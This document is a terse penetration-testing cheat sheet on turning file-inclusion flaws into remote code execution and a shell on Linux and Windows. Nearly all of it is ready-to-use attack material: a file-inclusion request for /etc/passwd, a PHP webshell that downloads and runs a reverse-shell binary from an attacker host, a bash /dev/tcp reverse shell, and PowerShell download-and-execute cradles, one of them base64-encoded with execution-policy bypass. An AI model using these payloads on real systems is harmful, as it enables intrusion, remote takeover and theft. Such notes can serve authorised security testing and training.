# from LFI/RFI to RCE to Shell

## Linux

 /admin.php?ACS_path=/etc/passwd

  /admin.php?ASC_path=http://10.x.x.x/rce.php?cmd=id


  rce.php -->

 ```php
 <?php
   echo "test"; 
   print("test"); 
   system("ls"); 
   eval("id");
   print($_GET["cmd"]);

   //msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.x.x.x LPORT=443 -f elf > rshellbinary
   system("wget http://10.x.x.x/shellbinary -O /tmp/shellbinary");
   system("chmod +x /tmp/shellbinary");
   system("file /tmp/shellbinary");
   system("/tmp/shellbinary");
  ?>
 ```

 ```
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.139/8888 0>&1'); ?>
 ```


```
 
 ```



 ## on Windows

 python -m SimpleHTTPServer 80
 nishang/shells/Invoke-PowerShellTcp.ps1 --> `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.x.x -Port 443` at end of file


 nc -nlvp  443

 ```cmd
 PS 5.1: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 PS 5.1: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe


 c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -command "& IEX(New-Object Net.WebClient).downloadString(\"http://10.10.x.x/Invoke-PowerShellTcp.ps1\")"'
 ```

```
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcANwAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQAKAA==
```
```
echo "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.77/Invoke-PowerShellTcp.ps1\")" | iconv --to-code UTF-16LE | base64 -w 0
```

tags: #rce #reverse_shell #lfi #rfi #powershell #rce2shell 
